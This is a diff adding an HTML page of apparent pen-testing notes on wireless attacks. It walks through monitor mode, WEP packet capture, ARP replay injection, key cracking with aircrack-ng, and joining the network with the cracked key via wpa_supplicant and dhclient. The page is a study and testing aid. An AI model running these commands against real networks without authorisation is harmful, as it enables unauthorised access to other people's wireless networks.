@@ -1,1 +1,44 @@
-
+<h1><span style="font-size: x-large;">Wireless Attacks</span></h1>
+<p><span style="font-size: large;">- Below are very important steps prior to any pen testing</span></p>
+<p>&nbsp;</p>
+<p><span style="text-decoration: underline; color: #ff00ff;"><span style="font-size: medium;">List interfaces:</span></span></p>
+<p><span style="color: #000000;"><span style="font-size: medium;">- iw dev</span></span></p>
+<p>&nbsp;</p>
+<hr />
+<p>&nbsp;</p>
+<p><span style="color: #000000;"><span style="font-size: medium;">- iwconfig</span></span></p>
+<p>&nbsp;</p>
+<p><span style="text-decoration: underline; color: #ff6600;"><span style="font-size: medium;">Monitor Mode:</span></span></p>
+<p><span style="font-size: medium; color: #000000;">-&nbsp;</span><span style="font-size: medium;">airmon-ng start wlan0</span></p>
+<hr />
+<p>&nbsp;</p>
+<p><span style="font-size: medium; color: #000000;">- ifconfig &lt;interface&gt; down</span></p>
+<p><span style="font-size: medium; color: #000000;">&nbsp; iw dev &lt;interface&gt; set monitor none</span></p>
+<p><span style="font-size: medium; color: #000000;">&nbsp; ifconfig &lt;interface&gt; up</span></p>
+<p>&nbsp;</p>
+<p><span style="text-decoration: underline;"><span style="font-size: medium; color: #3366ff; text-decoration: underline;">Check and Kill:</span></span></p>
+<p><span style="color: #000000;"><span style="font-size: medium;">airmon-ng check</span></span></p>
+<p><span style="color: #000000;"><span style="font-size: medium;">airmon-ng check kill</span></span></p>
+<p>&nbsp;</p>
+<h2><span style="font-size: x-large;"><strong>WEP Live Cracking&nbsp;</strong></span></h2>
+<p><span style="font-size: small;">- need to capture many IV packets</span></p>
+<p>&nbsp;</p>
+<p><span style="font-size: x-large;">airodump-ng wlan0 <span style="font-size: medium;">#ensure the interface name has not changed</span></span></p>
+<p><span style="font-size: x-large;">airodump-ng --bssid B8:0D:F7:D5:79:F9 -c 6 wlan0mon <span style="font-size: medium;">#bssid and channel for specific capture, add -w for output</span></span></p>
+<p><span style="font-size: x-large;">aireplay-ng -3 -b B8:0D:F7:D5:79:F9 -h 02:00:00:00:09:00 wlan0 <span style="font-size: medium;">#-3 = ARP -b=bssid -h=source mac</span>&nbsp;</span></p>
+<p><span style="font-size: x-large;">aircrack-ng filename.cap <span style="font-size: medium;"># use aircrack once you have enough IVs</span></span></p>
+<p>&nbsp;</p>
+<hr />
+<p><strong><span style="font-size: x-large;">To connect to the network with found key:</span></strong></p>
+<p><span style="font-size: medium;">- use wpa supplicant - first create a .conf file, then connect</span></p>
+<p><span style="font-size: medium;">- Note you must start this on a different wireless interface&nbsp;</span></p>
+<p>&nbsp;</p>
+<p><span style="font-size: x-large;">network={</span><br /><span style="font-size: x-large;">ssid="enter name of network"</span><br /><span style="font-size: x-large;">key_mgmt=NONE</span><br /><span style="font-size: x-large;">wep_key0="enter password/key"</span><br /><span style="font-size: x-large;">wep_tx_keyidx=0</span><br /><span style="font-size: x-large;">}</span></p>
+<p>&nbsp;</p>
+<p><span style="font-size: x-large;">wpa_supplicant -B -Dnl80211 -iwlan1 -c &lt;conf file name&gt;&nbsp; <span style="font-size: medium;"># -B = background -D = driver (it is normally nl80211) -i = interface -c = conf file</span></span></p>
+<p>&nbsp;</p>
+<hr />
+<p>&nbsp;</p>
+<p><span style="font-size: x-large;"><strong>to get IP address of the new interface you started</strong></span></p>
+<p>&nbsp;</p>
+<p><span style="font-size: x-large;">dhclient -v wlan1 <span style="font-size: medium;"># you can then scan with nmap</span></span></p>
